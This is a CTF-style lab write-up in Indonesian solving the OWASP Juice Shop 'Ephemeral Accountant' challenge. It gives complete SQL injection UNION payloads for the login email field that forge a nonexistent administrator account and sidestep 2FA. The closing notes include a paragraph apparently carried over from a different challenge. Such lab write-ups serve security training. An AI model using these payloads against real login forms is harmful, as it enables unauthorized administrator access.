# Ephemeral Accountant

## Deskripsi
Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.

## Resource
https://portswigger.net/web-security/sql-injection/examining-the-database

https://portswigger.net/web-security/sql-injection/union-attacks

## Langkah - langkah
1. Cari schema untuk tabel `Users` (didapat dari soal `Database Schema`).
   <img width="1919" height="1140" alt="image" src="https://github.com/user-attachments/assets/59ac8d25-3050-4922-a6a8-ff5aee2ba325" />
   Ada 13 kolom, yaitu `id`, `username`, `email`, `password`, `role`, `deluxeToken`, `lastLoginIp`, `profileImage`, `totpSecret`, `isActive`, `createdAt`, `updatedAt`, `deletedAt`

2. Masuk ke login page.
   <img width="1919" height="1091" alt="image" src="https://github.com/user-attachments/assets/0a12cb6c-ec24-46f0-968e-b1cefbc2491b" />

3. Buat payload yang akan dimasukkan ke kolom "Email", yaitu `admin' UNION SELECT * FROM (SELECT 67, 'acc0unt4nt@juice-sh.op', 'acc0unt4nt@juice-sh.op', 'aaaa', 'Administrator', '1234', '127.0.0.1', '/assets/public/images/uploads/default.svg', '676941', 0, 1, 2, 3)--`
   <img width="1919" height="1091" alt="image" src="https://github.com/user-attachments/assets/bd0ec853-7fb5-4dd0-bc95-6cd53f97c811" />
   Hasil:
   <img width="1919" height="1091" alt="image" src="https://github.com/user-attachments/assets/882897db-38c1-4ab8-a06e-f6c7e2775c36" />

4. Karena ada 2FA, maka kosongkan kolom `totpSecret` pada payload.

   Payload: `admin' UNION SELECT * FROM (SELECT 67, 'acc0unt4nt@juice-sh.op', 'acc0unt4nt@juice-sh.op', 'aaaa', 'Administrator', '1234', '127.0.0.1', '/assets/public/images/uploads/default.svg', '', 0, 1, 2, 3)--`
   <img width="1919" height="1085" alt="image" src="https://github.com/user-attachments/assets/2b5fea98-920a-4634-8366-9205fa282cda" />
   Hasil:
   <img width="1919" height="1092" alt="image" src="https://github.com/user-attachments/assets/3723a658-72d3-42ce-84c1-b9c3926ec3f8" />

6. Karena ada error `FOREIGN KEY constraint failed`, kurangi kolom `id` dari `67` menjadi `20`.

   Payload: `admin' UNION SELECT * FROM (SELECT 20, 'acc0unt4nt@juice-sh.op', 'acc0unt4nt@juice-sh.op', 'aaaa', 'Administrator', '1234', '127.0.0.1', '/assets/public/images/uploads/default.svg', '', 0, 1, 2, 3)--`   
   <img width="1919" height="1084" alt="image" src="https://github.com/user-attachments/assets/9728f52b-a356-4a98-8a7c-d272328b7e86" />
   Hasil:
   <img width="1919" height="1084" alt="image" src="https://github.com/user-attachments/assets/e5cd0538-2138-463f-8f80-c39a72c73dcd" />

## Catatan
Karena schema table sudah ada dari soal lain, maka bisa digunakan untuk membuat payload tanpa harus menentukan tipe dan jumlah kolom.

Selain itu, adanya 2FA saat mencoba login disebabkan kolom `totpSecret` yang tidak kosong, tetapi datanya tidak ada di database sehingga tidak ada token yang valid untuk akun ini.
Karena struktur query SQL tidak diketahui, maka cari jumlah kolom yang sesuai untuk UNION.

Setelah mendapatkan jumlah kolom, dapatkan seluruh schema database dari tabel sqlite_schema. Hal ini menunjukkan bahwa database yang digunakan adalah SQLite.
